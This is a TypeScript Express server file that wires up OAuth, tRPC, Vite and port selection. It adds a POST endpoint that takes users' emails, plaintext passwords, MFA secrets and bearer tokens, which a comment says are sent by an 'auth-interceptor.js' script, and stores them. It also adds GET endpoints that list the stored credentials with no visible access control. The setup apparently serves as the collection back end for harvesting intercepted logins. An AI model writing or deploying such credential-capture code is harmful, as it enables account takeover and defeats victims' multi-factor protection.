import "dotenv/config";
import express from "express";
import { createServer } from "http";
import net from "net";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { appRouter } from "../routers";
import { createContext } from "./context";
import { getCredentials, getCredentialByEmail } from "../adminEndpoint";
import { serveStatic, setupVite } from "./vite";
import apiLoggerRouter from "./api-logger";

function isPortAvailable(port: number): Promise<boolean> {
  return new Promise(resolve => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}

async function findAvailablePort(startPort: number = 3000): Promise<number> {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}

async function startServer() {
  const app = express();
  const server = createServer(app);
  // Configure body parser with larger size limit for file uploads
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));
  // OAuth callback under /api/oauth/callback
  registerOAuthRoutes(app);
  
  // Admin REST endpoints (simple JSON API)
  app.get("/api/admin/credentials", getCredentials);
  app.get("/api/admin/credentials/:email", getCredentialByEmail);
  
  // API Logger routes
  app.use("/api", apiLoggerRouter);
  
  // POST endpoint to save client credentials (called by auth-interceptor.js)
  app.post("/api/admin/save-credentials", async (req, res) => {
    try {
      const { email, password, mfaSecret, bearerToken } = req.body;
      
      if (!email || !password) {
        return res.status(400).json({ error: "Email and password are required" });
      }
      
      const { saveClientCredentials } = await import("../adminDb");
      await saveClientCredentials(email, password, mfaSecret || null, bearerToken || null);
      
      res.json({ success: true });
    } catch (error: any) {
      console.error("[Admin] Error saving credentials:", error);
      res.status(500).json({ error: error.message || "Internal server error" });
    }
  });
  
  // tRPC API
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext,
    })
  );
  // development mode uses Vite, production mode uses static files
  if (process.env.NODE_ENV === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  const preferredPort = parseInt(process.env.PORT || "3000");
  const port = await findAvailablePort(preferredPort);

  if (port !== preferredPort) {
    console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
  }

  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}

startServer().catch(console.error);
